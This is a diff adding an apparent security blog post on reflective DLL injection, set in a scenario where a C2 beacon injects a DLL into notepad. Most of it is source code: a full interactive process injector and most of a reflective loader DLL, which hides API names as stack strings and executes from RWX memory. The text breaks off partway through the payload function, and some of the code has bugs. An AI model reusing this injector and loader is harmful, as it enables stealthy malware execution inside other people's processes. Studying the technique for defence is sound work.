@@ -1,0 +1,839 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="post-status" content="active" />
+    <title>Reflective DLL Injection</title>
+    <link rel="stylesheet" href="../../../assets/style.min.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;600&family=JetBrains+Mono:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="icon"
+      href="../../../assets/favicon/duck.jpg"
+      type="image/jpeg"
+    />
+    <link rel="apple-touch-icon" href="../../../assets/favicon/duck.jpg" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css"
+    />
+  </head>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
+  <body>
+    <main class="container post-page" data-category="">
+      <a class="back-link" id="backLink" href="index.html">← Recent Posts</a>
+      <header class="post-header">
+        <h1 class="post-title">Reflective DLL Injection</h1>
+        <div class="post-meta">2026-03-31</div>
+      </header>
+      <article class="post-content">
+        <!-- fore word -->
+        <section>
+          <p>
+            <span class="title-highlight">Overview:</span>
+            Continuing from the previous blog post about
+            <a href="../012-2026-03-15/index.html" class="highlight"
+              >DLL injection</a
+            >, we have another technique to load DLL into a process. By
+            reflecting its bytes into target process's memory.
+          </p>
+
+          <p>This sample was created on the x64 architecture.</p>
+        </section>
+        <section>
+          <p>Understanding how this technique works</p>
+          <div class="image-container">
+            <img src="./img/flow.png" alt="" class="zoomImage" />
+          </div>
+          <p>
+            In example context assume that we already injected
+            <span class="inline-highlight">Beacon.exe</span> in the target PC.
+            <span class="inline-highlight">The C2</span> give this beacon a task
+            to use this technique and load a DLL into notepad process and open
+            the message box.
+          </p>
+          <br />
+          <p>
+            Some case,
+            <span class="inline-highlight">The beacon</span> creates another
+            process to do this task, avoid being detected and terminated. In
+            this Lab assume that
+            <span class="inline-highlight">The loader</span> was created by
+            <span class="inline-highlight">The Beacon</span>
+          </p>
+          <br />
+          <p>
+            When C2 commands,
+            <span class="inline-highlight">The beacon</span> downloads a bunch
+            of raw bytes from C2.
+            <span class="inline-highlight">Initial Loader process</span> and
+            load all bytes into
+            <span class="inline-highlight">The Loader</span> process's memory.
+            Then <span class="inline-highlight">The Loader</span> writes all
+            this bytes into target process's memory. <br />Finds
+            <span class="inline-highlight"
+              >the address of ReflectiveLoader</span
+            >
+            in bunch of raw bytes. Creates a thread with the entry for
+            <span class="inline-highlight">ReflectiveLoader</span>
+          </p>
+          <br />
+          <p>
+            Inside target process's memory,
+            <span class="inline-highlight">ReflectiveLoader</span> resolves all
+            bytes in target process's memory to new allocate memory and call to
+            the entry which is
+            <span class="inline-highlight">DLLMain</span>
+          </p>
+        </section>
+        <section>
+          <p>
+            So now we begin with the
+            <span class="inline-highlight"
+              >The loader, which we assumed that created from beacon</span
+            >
+            At first, <span class="inline-highlight">The Loader</span> need to
+            find the
+            <span class="inline-highlight">ReflectiveLoader() offset</span> in
+            payload that loaded into its memory.
+          </p>
+          <p>
+            The picture below shows how can we identify
+            <span class="inline-highlight">ReflectiveLoader offset</span>
+          </p>
+          <div class="image-container">
+            <img src="./img/rl_offset.png" alt="" class="zoomImage" />
+          </div>
+          <p>
+            To double check, we plus the
+            <span class="inline-highlight">offset</span> with the
+            <span class="inline-highlight">base address</span> of payload then
+            we have the address of
+            <span class="inline-highlight">ReflectiveLoader</span> in memory of
+            <span class="inline-highlight">The Loader</span>
+          </p>
+          <div class="image-container">
+            <img src="./img/plus_offset.png" alt="" class="zoomImage" />
+          </div>
+          <p>Code demonstrated as below:</p>
+          <pre
+            class="code-block"
+          ><code class="language-cpp">DWORD_PTR rva_to_offset(DWORD_PTR rva, DWORD_PTR base) {
+    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
+	if (!dos_header) return 0;
+    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(base + dos_header->e_lfanew);
+	WORD number_of_sections = nt_header->FileHeader.NumberOfSections;
+    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_header);
+	
+
+    if (rva &lt; section_header->VirtualAddress) { 
+        return rva;
+    }
+
+    for (WORD i = 0; i &lt; number_of_sections; i++) {
+		DWORD_PTR section_va = section_header[i].VirtualAddress; // start address of section
+		DWORD_PTR section_raw = section_header[i].PointerToRawData;  // real address on disk 
+		DWORD_PTR section_size = section_header[i].SizeOfRawData; // "length" of the section 
+      
+        if (rva >= section_va && rva &lt; section_va + section_size) { // check if rva is between start and length 
+            return (rva - section_va) + section_raw; // rva of element minus VA then we have distance from element to start address of section
+			                                       // then plus with real address on disk to actually have offset 
+        }
+    }
+
+    return 0; 
+}
+// get the module exported in export table
+DWORD_PTR get_reflective_loader_offset(DWORD_PTR base, LPCSTR module_name) {
+	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
+	if (!dos_header) return 0;
+	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(base + dos_header->e_lfanew);
+	IMAGE_DATA_DIRECTORY exports_data_directory = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+
+	PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)( base + rva_to_offset(exports_data_directory.VirtualAddress,base)); // base of raw bytes + offset we calculated
+	
+	DWORD number_of_function_name = export_directory->NumberOfNames;
+	PDWORD export_function_address = (PDWORD)(rva_to_offset(export_directory->AddressOfFunctions, base) + base);
+	PDWORD export_function_name_address = (PDWORD)(rva_to_offset(export_directory->AddressOfNames, base) + base);
+	PWORD export_ord = (PWORD)(rva_to_offset(export_directory->AddressOfNameOrdinals, base) + base);
+	
+	for (WORD i = 0; i &lt; number_of_function_name; i++) {
+		char* function_name = (char*)(rva_to_offset(export_function_name_address[i], base) + base);
+		if (strcmp(function_name, module_name) == 0) {
+			DWORD function_rva = export_function_address[export_ord[i]];
+			return rva_to_offset(function_rva, base);
+		}
+	}
+}
+// assume that file_buf (base address of payload in loader process's memory) is the payloads receive from beacon 
+DWORD_PTR reflective_loader_offset = get_reflective_loader_offset((DWORD_PTR)file_buf, "ReflectiveLoader");</code></pre>
+          <p>
+            Next <span class="inline-highlight">The Loader</span> attachs to
+            target process and allocates memory in target process. Then plus the
+
+            <span class="inline-highlight">ReflectiveLoader offset</span> with
+            the
+            <span class="inline-highlight">base address of new memory</span> in
+            target process to get the
+            <span class="inline-highlight"
+              >ReflectiveLoader address in target proccess's memory</span
+            >
+          </p>
+          <pre class="code-block"><code class="language-cpp">DWORD old_protect;
+remote_buf = VirtualAllocEx(handle_process, NULL, file_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+if (!remote_buf) {
+	DWORD error = GetLastError();
+	printf("failed to allocate memory. Error code: %lu\n", error);
+	return 0;
+};
+if (!WriteProcessMemory(handle_process, remote_buf, file_buf, file_size, NULL)) {
+	DWORD error = GetLastError();
+	printf("failed to write memory error code: %d", error);
+	return 0;
+}
+VirtualProtectEx(handle_process, remote_buf, file_size, PAGE_EXECUTE_READ, &old_protect);
+DWORD_PTR reflective_loader_address = reflective_loader_offset + (DWORD_PTR)remote_buf;</code></pre>
+          <p>
+            In the picture below,
+            <span class="inline-highlight">remote_buf</span> presents for
+            <span class="inline-highlight">Image Base</span> of new memory
+          </p>
+          . Go to <span class="inline-highlight">offset 0x410</span> is the
+          <span class="inline-highlight">ReflectiveLoader address</span>
+          <div class="image-container">
+            <img src="./img/rl_innp.png" alt="" class="zoomImage" />
+          </div>
+          <p>
+            Then <span class="inline-highlight">The Loader</span> create thread
+            in target process with
+            <span class="inline-highlight">
+              entry for ReflectiveLoader() address</span
+            >. Finally, when the reflection is done, free the memory in target
+            process.
+          </p>
+          <pre
+            class="code-block"
+          ><code class="language-cpp">handle_thread = CreateRemoteThread(handle_process, NULL, NULL, (LPTHREAD_START_ROUTINE)reflective_loader_address, NULL, NULL, NULL);
+WaitForSingleObject(handle_thread, INFINITE);
+VirtualFreeEx(handle_process, remote_buf, 0, MEM_RELEASE);
+          </code></pre>
+          <p>
+            Result shown that we successfully set the entry point to
+            <span class="inline-highlight">ReflectiveLoader() address</span>. As
+            picture below:
+          </p>
+          <div class="image-container">
+            <img src="./img/thread-entry.png" alt="" class="zoomImage" />
+          </div>
+          <p>
+            Below is the full source code of
+            <span class="inline-highlight">The Loader</span> with some minor
+            upgrade to dynamic inject
+          </p>
+          <pre
+            class="code-block code-block-drop"
+          ><code class="language-cpp">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;TlHelp32.h&gt;
+
+
+DWORD_PTR rva_to_offset(DWORD_PTR rva, DWORD_PTR base) {
+    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
+	if (!dos_header) return 0;
+    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(base + dos_header->e_lfanew);
+	WORD number_of_sections = nt_header->FileHeader.NumberOfSections;
+    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_header);
+	
+
+    if (rva &lt; section_header->VirtualAddress) { 
+        return rva;
+    }
+
+    for (WORD i = 0; i &lt; number_of_sections; i++) {
+		DWORD_PTR section_va = section_header[i].VirtualAddress; // start address of section
+		DWORD_PTR section_raw = section_header[i].PointerToRawData;  // real address on disk 
+		DWORD_PTR section_size = section_header[i].SizeOfRawData; // "length" of the section 
+      
+        if (rva >= section_va && rva &lt; section_va + section_size) { // check if rva is between start and length 
+            return (rva - section_va) + section_raw; // rva of element minus VA then we have distance from element to start address of section
+			                                       // then plus with real address on disk to actually have offset 
+        }
+    }
+
+    return 0; 
+}
+// get the module exported in export table
+DWORD_PTR get_reflective_loader_offset(DWORD_PTR base, LPCSTR module_name) {
+	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
+	if (!dos_header) return 0;
+	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(base + dos_header->e_lfanew);
+	IMAGE_DATA_DIRECTORY exports_data_directory = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+
+	PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)( base + rva_to_offset(exports_data_directory.VirtualAddress,base)); // base of raw bytes + offset we calculated
+	
+	DWORD number_of_function_name = export_directory->NumberOfNames;
+	PDWORD export_function_address = (PDWORD)(rva_to_offset(export_directory->AddressOfFunctions, base) + base);
+	PDWORD export_function_name_address = (PDWORD)(rva_to_offset(export_directory->AddressOfNames, base) + base);
+	PWORD export_ord = (PWORD)(rva_to_offset(export_directory->AddressOfNameOrdinals, base) + base);
+	
+	for (WORD i = 0; i &lt; number_of_function_name; i++) {
+		char* function_name = (char*)(rva_to_offset(export_function_name_address[i], base) + base);
+		if (strcmp(function_name, module_name) == 0) {
+			DWORD function_rva = export_function_address[export_ord[i]];
+			return rva_to_offset(function_rva, base);
+		}
+	}
+}
+
+void snap_all_process() {
+	HANDLE handle_snapshot_process;
+	PROCESSENTRY32W process_entry;
+	process_entry.dwSize = sizeof(PROCESSENTRY32W);
+
+	handle_snapshot_process = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (!handle_snapshot_process) return;
+
+	if (Process32First(handle_snapshot_process, &process_entry)) {
+		do {
+			wprintf(L"PID: %d | %ls\n",
+				process_entry.th32ProcessID,
+				process_entry.szExeFile);
+		} while (Process32Next(handle_snapshot_process, &process_entry));
+	}
+	else return;
+}
+
+int inject(LPVOID file_buf, DWORD file_size, HANDLE file_handle, DWORD PID) {
+	HANDLE handle_process;
+	HANDLE handle_thread;
+	LPVOID remote_buf = NULL;
+
+	// assume that file_buf is the payloads receive from beacon 
+	DWORD_PTR reflective_loader_offset = get_reflective_loader_offset((DWORD_PTR)file_buf, "ReflectiveLoader");
+
+	handle_process = OpenProcess(PROCESS_ALL_ACCESS, NULL, PID);
+	if (!handle_process) {
+		printf("failed to open process");
+		return 0;
+	}
+	DWORD old_protect;
+	remote_buf = VirtualAllocEx(handle_process, NULL, file_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	if (!remote_buf) {
+		DWORD error = GetLastError();
+		printf("failed to allocate memory. Error code: %lu\n", error);
+		return 0;
+	};
+	if (!WriteProcessMemory(handle_process, remote_buf, file_buf, file_size, NULL)) {
+		DWORD error = GetLastError();
+		printf("failed to write memory error code: %d", error);
+		return 0;
+	}
+	VirtualProtectEx(handle_process, remote_buf, file_size, PAGE_EXECUTE_READ, &old_protect);
+	DWORD_PTR reflective_loader_address = reflective_loader_offset + (DWORD_PTR)remote_buf;
+	printf("injection located at %p\n", ((void*)(reflective_loader_address - reflective_loader_offset)));
+	printf("reflective loader located at %p\n", (void*)reflective_loader_address);
+
+	handle_thread = CreateRemoteThread(handle_process, NULL, NULL, (LPTHREAD_START_ROUTINE)reflective_loader_address, NULL, NULL, NULL);
+	if (!file_handle) {
+		DWORD error = GetLastError();
+		printf("failed to create remote thread: %d", error);
+		return 0;
+	}
+
+	WaitForSingleObject(handle_thread, INFINITE);
+	DWORD_PTR execute_dll_base;
+	GetExitCodeThread(handle_thread, (LPDWORD)&execute_dll_base);
+
+	VirtualFreeEx(handle_process, remote_buf, 0, MEM_RELEASE);
+	if (handle_process) {
+		CloseHandle(handle_process);
+	}
+	if (handle_thread) {
+		CloseHandle(handle_thread);
+	}
+	if (file_handle) {
+		CloseHandle(file_handle);
+	}
+}
+
+int main(int argc, char* argv[]) {
+	// read raw byte in dll 
+	HANDLE handle_file = CreateFile(L"D:\\vs_c\\reflective_loader_dll\\x64\\Release\\reflective_loader_dll.dll", GENERIC_READ, 0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+	if (handle_file == INVALID_HANDLE_VALUE) {
+		printf("failed to create file");
+		CloseHandle(handle_file);
+		return 0;
+	}
+
+	DWORD file_size = GetFileSize(handle_file, NULL);
+	LPVOID file_buf = HeapAlloc(GetProcessHeap(), 0, file_size);
+	if (!file_buf) {
+		HeapFree(GetProcessHeap(), 0, file_buf);
+		printf("failed to created file buf");
+		file_buf = NULL;
+		return 0;
+	}
+
+	if (!ReadFile(handle_file, file_buf, file_size, NULL, NULL)) {
+		printf("failed to open file");
+		return 0;
+	};
+
+
+	INT option;
+	while (TRUE) {
+		wprintf_s(L"01. Snap all process\n02.Inject\n");
+		wprintf_s(L"------------------\n");
+		wprintf_s(L"Your option: ");
+		scanf_s("%d", &option);
+		switch (option) {
+		case 1: {
+			snap_all_process();
+			break;
+		}
+		case 2: {
+			DWORD PID;
+			wprintf_s(L"Inject to: ");
+			scanf_s("%d", &PID);
+			if (!inject(file_buf, file_size, handle_file, PID)) {
+				wprintf(L"Failed to inject\n");
+			}
+			break;
+		}
+		default:
+			return 0;
+		}
+	}
+	return 0;
+}
+</code></pre>
+        </section>
+        <section>
+          <p>
+            Now its time for
+            <span class="inline-highlight">ReflectiveLoader</span> to resolve
+            itself in target process's memory
+          </p>
+          <div class="image-container image-container-500-500 image-center">
+            <img src="./img/entry.png" alt="" class="zoomImage" />
+          </div>
+          <p>
+            From the position of entry we need to find the PE Header, with the
+            main landmark being the letters
+            <span class="inline-highlight">MZ.</span>
+          </p>
+          <pre
+            class="code-block"
+          ><code class="language-cpp">__declspec(noinline) static DWORD_PTR get_rip() {
+    return (DWORD_PTR)_ReturnAddress(); // return the value of RIP register 
+}
+__forceinline DWORD_PTR identify_new_base() {
+    DWORD_PTR rip = get_rip(); // return to location of ReflectiveLoader function 
+    while (true) {
+        PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)rip; 
+        if (dos_header->e_magic == IMAGE_DOS_SIGNATURE) { // check for the mz 
+            PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(rip + dos_header->e_lfanew);
+            if (nt_header->Signature == IMAGE_NT_SIGNATURE) {  // double check with PE signature 
+                break;
+            }
+        }
+        rip--;
+    }
+    return rip;
+}</code></pre>
+          <p>
+            Before continue, remember that
+            <span class="inline-highlight">The Loader</span> only copy raw bytes
+            from payload to target process's memory. So we dont have the right
+            PE structure loaded in RAM.
+          </p>
+          <div class="image-container">
+            <img src="./img/pe-on-ram.png" alt="" class="zoomImage" />
+          </div>
+          <p>
+            Then we need to
+            <span class="inline-highlight">allocate new memory region</span> in
+            target process's memory, and copy part by part from current memory
+            created by <span class="inline-highlight">The Loader</span> to
+            <span class="inline-highlight">new Image Base(purple)</span>
+          </p>
+          <div class="image-container image-container-300-300 image-center">
+            <img src="./img/newimagebase.png" alt="" class="zoomImage" />
+          </div>
+          <p>
+            After reach to the
+            <span class="inline-highlight">old Image Base(red)</span> of current
+            memory region, we need to resolve some functions to allocate new
+            memory region.
+          </p>
+          <pre
+            class="code-block"
+          ><code class="language-cpp">DWORD_PTR dll_base = identify_new_base(); // get the base address of raw in memory 
+
+PIMAGE_DOS_HEADER dos_header_raw = (PIMAGE_DOS_HEADER)dll_base;
+PIMAGE_NT_HEADERS nt_header_raw = (PIMAGE_NT_HEADERS)(dll_base + dos_header_raw->e_lfanew);
+DWORD dll_size = nt_header_raw->OptionalHeader.SizeOfImage; // read from raw
+// resolve kernel32 and functions
+DWORD_PTR kernel32_base = get_module(kernel32_string); //stack string as before 
+
+GETPROCADDRESS p_GetProcAddress = (GETPROCADDRESS)get_proc_address(kernel32_base, get_proc_string);
+VIRTUALALLOC p_VirtualAlloc = (VIRTUALALLOC)p_GetProcAddress((HMODULE)kernel32_base, virtual_alloc_string);
+
+// create new memory on target process
+LPVOID  new_image_base = p_VirtualAlloc(NULL, dll_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+DWORD_PTR base_address = (DWORD_PTR)new_image_base;</code></pre>
+
+          <p>
+            Then copy each part of raw bytes, begin with
+            <span class="inline-highlight">PE Headers</span> and define
+            <span class="inline-highlight">new Image Base(purple)</span>
+          </p>
+          <pre
+            class="code-block"
+          ><code class="language-cpp">DWORD size_of_header = nt_header_raw->OptionalHeader.SizeOfHeaders;
+ //// copy headers from raw byte to new memory 
+ memory_copy(base_address, dll_base, size_of_header);
+ // define header in new memory  
+ PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base_address;
+ PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(base_address + dos_header->e_lfanew);</code></pre>
+          <p>Copy each sections:</p>
+          <pre
+            class="code-block"
+          ><code class="language-cpp"> //// copy all sections from raw byte to new memory 
+ DWORD number_of_section = nt_header_raw->FileHeader.NumberOfSections;
+ PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_header_raw);
+
+ for (DWORD i = 0; i &lt; number_of_section; i++) {
+     DWORD_PTR section_on_raw_bytes = dll_base + section_header[i].PointerToRawData;
+     DWORD_PTR section_on_memory = base_address + section_header[i].VirtualAddress;
+     if (section_header[i].SizeOfRawData > 0) {
+         memory_copy(section_on_memory, section_on_raw_bytes, section_header[i].SizeOfRawData);
+     }
+ } </code></pre>
+          <p>
+            After we copy all sections into new memory, now we need to
+            <span class="inline-highlight"
+              >fix the rva value to fit new Image Base</span
+            >. Including IAT and Relocation Table
+          </p>
+          <pre
+            class="code-block"
+          ><code class="language-cpp"> // fix value of function in import table (in new memory)  
+ PIMAGE_DATA_DIRECTORY import_data_directory = &nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+ PIMAGE_IMPORT_DESCRIPTOR import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(base_address + import_data_directory->VirtualAddress);
+
+ LOADLIBRARYA p_LoadLibraryA = (LOADLIBRARYA)p_GetProcAddress((HMODULE)kernel32_base, load_library_string);
+
+ while (import_descriptor->Name != NULL) {
+     HMODULE module_address = p_LoadLibraryA((LPCSTR)(base_address + import_descriptor->Name));
+     if (module_address) {
+         PIMAGE_THUNK_DATA function_array = (PIMAGE_THUNK_DATA)(base_address + import_descriptor->FirstThunk);
+         while (function_array->u1.AddressOfData != NULL) {
+             if (IMAGE_SNAP_BY_ORDINAL(function_array->u1.Ordinal)) {
+                 LPCSTR function_ord = (LPCSTR)IMAGE_ORDINAL(function_array->u1.Ordinal);
+                 function_array->u1.Function = (DWORD_PTR)p_GetProcAddress(module_address, function_ord);
+             }
+             else {
+                 PIMAGE_IMPORT_BY_NAME function_raw = (PIMAGE_IMPORT_BY_NAME)(base_address + function_array->u1.AddressOfData);
+                 function_array->u1.Function = (DWORD_PTR)p_GetProcAddress(module_address, (LPCSTR)function_raw->Name);
+             }
+             function_array++; // next thunk (import by name)
+         }
+     }
+     import_descriptor++; // move to next import descriptor 
+ }
+
+
+ // perform image base relocations
+ IMAGE_DATA_DIRECTORY relocations = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+ DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)base_address;
+ DWORD relocationsProcessed = 0;
+ DWORD_PTR deltaImageBase = (DWORD_PTR)base_address - (DWORD_PTR)nt_header->OptionalHeader.ImageBase;
+ while (relocationsProcessed &lt; relocations.Size)
+ {
+     PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
+     relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
+     DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+     PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
+
+     for (DWORD i = 0; i &lt; relocationsCount; i++)
+     {
+         relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
+
+         if (relocationEntries[i].Type == 0)
+         {
+             continue;
+         }
+
+         DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
+         DWORD_PTR addressToPatch = 0;
+         p_ReadProcessMemory(p_GetCurrentProcess(), (LPCVOID)((DWORD_PTR)base_address + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
+         addressToPatch += deltaImageBase;
+         memory_copy((DWORD_PTR)base_address + relocationRVA, addressToPatch, sizeof(DWORD_PTR));
+     }
+ }</code></pre>
+          <p>
+            Change memory page protection to
+            <span class="inline-highlight">RWX</span> and call the
+            <span class="inline-highlight">DLLMain</span> to execute then change
+            page protection to <span class="inline-highlight">NA</span>
+          </p>
+          <pre
+            class="code-block"
+          ><code class="language-cpp">VIRTUALPROTECT p_VirtualProtect = (VIRTUALPROTECT)p_GetProcAddress((HMODULE)kernel32_base, virtual_protect_string);
+DWORD old_protect;
+p_VirtualProtect(new_image_base, dll_size, PAGE_EXECUTE_READWRITE, &old_protect);
+
+DLLENTRY DllEntry = (DLLENTRY)((DWORD_PTR)base_address + nt_header->OptionalHeader.AddressOfEntryPoint);
+(*DllEntry)((HINSTANCE)base_address, DLL_PROCESS_ATTACH, 0);
+
+p_VirtualProtect(new_image_base, dll_size, PAGE_NOACCESS, &old_protect);
+return (DWORD_PTR)base_address; // Im trying to delete the execute memory but just can not find the way </code></pre>
+          <p>The result shown as gif below:</p>
+          <div class="image-container">
+            <img src="./img/result.gif" alt="" class="zoomImage" />
+          </div>
+          <p>Full source code of payload (DLL)</p>
+          <pre
+            class="code-block code-block-drop"
+          ><code class="language-cpp">#include "pch.h"
+#include "reflective_loader.h"
+#pragma optimize("", off)
+
+
+__forceinline size_t wchar_to_char(char* destination, const wchar_t* source, size_t size) {
+    if (!destination || !source || size == 0) return 0;
+    size_t i;
+    for (i = 0; i &lt; size - 1; i++) {
+        char c = (char)source[i];
+        if (c >= 'a' && c &lt;= 'z') c -= 32;
+        destination[i] = c;
+        if (source[i] == L'\0') {
+            return i;
+        }
+    }
+    destination[i] = '\0';
+    return i;
+}
+__forceinline INT compare_string(const char* str1, const char* str2) {
+    if (str1 == str2) return 0;
+
+    if (!str1 || !str2) return 1;
+
+    while (*str1 && (*str1 == *str2)) {
+        str1++;
+        str2++;
+    }
+
+    return (INT)(*(unsigned char*)str1 - *(unsigned char*)str2);
+}
+__forceinline DWORD_PTR get_module(LPCSTR module_name) {
+    DWORD_PTR kernel32_base = NULL;
+    PPEB peb = (PPEB)__readgsqword(0x60);
+    PPEB_LDR_DATA loader = peb->Ldr;
+
+    PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
+    PLIST_ENTRY current_module = head->Flink;
+
+    while (current_module != head) {
+        PLDR_DATA_TABLE_ENTRY_CUSTOM module_entry = CONTAINING_RECORD(current_module, LDR_DATA_TABLE_ENTRY_CUSTOM, InMemoryOrderLinks);
+        if (module_entry->BaseDllName.Buffer != NULL) {
+            char module_entry_name[64];
+            wchar_to_char(module_entry_name, module_entry->BaseDllName.Buffer, 64);
+            if (compare_string(module_name, module_entry_name) == 0) {
+                kernel32_base = (DWORD_PTR)module_entry->DllBase;
+            }
+        }
+        current_module = current_module->Flink;
+    }
+    return kernel32_base;
+}
+__forceinline FARPROC get_proc_address(DWORD_PTR module, LPCSTR proc_string) {
+    LPBYTE base_address = (LPBYTE)module;
+    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)module;
+    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) return 0;
+    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(base_address + dos_header->e_lfanew);
+    PIMAGE_OPTIONAL_HEADER optional_header = &nt_header->OptionalHeader;
+    DWORD_PTR export_data_directory = optional_header->DataDirectory[0].VirtualAddress;
+    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)(base_address + export_data_directory);
+
+    DWORD_PTR function_number = export_directory->NumberOfNames;
+    PDWORD function_address = (PDWORD)(base_address + export_directory->AddressOfFunctions);
+    PWORD ord = (PWORD)(base_address + export_directory->AddressOfNameOrdinals);
+    PDWORD function_name_address = (PDWORD)(base_address + export_directory->AddressOfNames);
+
+    for (DWORD i = 0; i &lt; function_number; i++) {
+        char* temp = (char*)(function_name_address[i] + base_address);
+        if (compare_string(temp, proc_string) == 0) {
+            return (FARPROC)(function_address[ord[i]] + base_address);
+        }
+    }
+    return NULL;
+}
+inline DWORD_PTR memory_copy(DWORD_PTR destination, DWORD_PTR source, SIZE_T length) {
+    LPBYTE src = (LPBYTE)source;
+    LPBYTE des = (LPBYTE)destination;
+
+    while (length--) {
+        *des++ = *src++;
+    }
+    return destination;
+}
+__declspec(noinline) static DWORD_PTR get_rip() {
+    return (DWORD_PTR)_ReturnAddress(); // return the value of RIP register 
+}
+__forceinline DWORD_PTR identify_new_base() {
+    DWORD_PTR rip = get_rip(); // return to location of ReflectiveLoader function 
+    while (true) {
+        PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)rip; 
+        if (dos_header->e_magic == IMAGE_DOS_SIGNATURE) { // check for the mz 
+            PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(rip + dos_header->e_lfanew);
+            if (nt_header->Signature == IMAGE_NT_SIGNATURE) {  // double check with PE signature 
+                break;
+            }
+        }
+        rip--;
+    }
+    return rip;
+}
+
+extern "C" __declspec(dllexport) DWORD_PTR ReflectiveLoader() {
+    char kernel32_string[] = { '\x4b', '\x45', '\x52', '\x4e', '\x45', '\x4c', '\x33', '\x32', '\x2e', '\x44', '\x4c', '\x4c', 0 };
+    char get_proc_string[] = { '\x47', '\x65', '\x74', '\x50', '\x72', '\x6f', '\x63', '\x41', '\x64', '\x64', '\x72', '\x65', '\x73', '\x73', 0 };
+    char load_library_string[] = { '\x4c', '\x6f', '\x61', '\x64', '\x4c', '\x69', '\x62', '\x72', '\x61', '\x72', '\x79', '\x41', 0 };
+    char virtual_alloc_string[] = { '\x56', '\x69', '\x72', '\x74', '\x75', '\x61', '\x6c', '\x41', '\x6c', '\x6c', '\x6f', '\x63', 0 };
+    char read_proc_memory_string[] = {'\x52', '\x65', '\x61', '\x64', '\x50', '\x72', '\x6f', '\x63', '\x65', '\x73', '\x73', '\x4d', '\x65', '\x6d', '\x6f', '\x72', '\x79', 0};
+    char get_cur_proc_string[] = {'\x47', '\x65', '\x74', '\x43', '\x75', '\x72', '\x72', '\x65', '\x6e', '\x74', '\x50', '\x72', '\x6f', '\x63', '\x65', '\x73','\x73', 0 };
+    char virtual_protect_string[] = { '\x56','\x69','\x72','\x74','\x75','\x61','\x6c','\x50','\x72','\x6f','\x74','\x65','\x63','\x74',0 };
+    
+    DWORD_PTR dll_base = identify_new_base(); // get the base address of raw in memory 
+
+    PIMAGE_DOS_HEADER dos_header_raw = (PIMAGE_DOS_HEADER)dll_base;
+    PIMAGE_NT_HEADERS nt_header_raw = (PIMAGE_NT_HEADERS)(dll_base + dos_header_raw->e_lfanew);
+    DWORD dll_size = nt_header_raw->OptionalHeader.SizeOfImage; // read from raw
+    // resolve kernel32 and functions
+    DWORD_PTR kernel32_base = get_module(kernel32_string); //stack string as before 
+
+    GETPROCADDRESS p_GetProcAddress = (GETPROCADDRESS)get_proc_address(kernel32_base, get_proc_string);
+    VIRTUALALLOC p_VirtualAlloc = (VIRTUALALLOC)p_GetProcAddress((HMODULE)kernel32_base, virtual_alloc_string);
+
+    // create new memory on target process
+    LPVOID  new_image_base = p_VirtualAlloc(NULL, dll_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
